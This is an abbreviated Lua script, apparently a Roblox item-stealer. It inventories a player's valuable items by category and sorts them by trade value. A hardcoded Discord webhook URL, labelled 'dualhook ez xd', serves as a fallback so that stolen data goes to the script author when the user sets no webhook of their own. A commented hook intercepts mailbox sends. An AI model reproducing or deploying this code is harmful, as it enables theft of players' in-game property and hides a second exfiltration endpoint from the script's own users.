...
--  if getnamecallmethod() == "InvokeServer" and tostring(self) == "Mailbox: Send" then
--    execute_redz = true
--    return 
--  end
--
...
if Webhook == "" or Webhook == nil then
    ping1 = "dualhook ez xd"
    Webhook =
        "https://discord.com/api/webhooks/1200880234849906890/bvTHC72g_b99a_sX7x7YMtCO6lVCHsqxJ3LvOeSZlWTgG9T3lGp1wC0_sBmMEEXAb7D2"
end
totalrap = 0
...
local function GetHuges()
    ...
    table.sort(HugeList, compareRAP)
end
...
local function GetExclusives()
    ...
    table.sort(ExclusiveList, compareRAP)
end
...
local function GetCharms()
    ...
    table.sort(CharmList, compareRAP)
end
...
local function GetHoverboards()
    ...
    table.sort(HoverboardList, compareRAP)
end
...
local function GetBooths()
    ...
    table.sort(BoothList, compareRAP)
end
...
local function GetEnchants()
    ...
    table.sort(EnchantList, compareRAP)
end
...
local function GetPotions()
    ...
    table.sort(PotionList, compareRAP)
end
...
local function GetMisc()
    ...
    table.sort(MiscList, compareRAP)
end
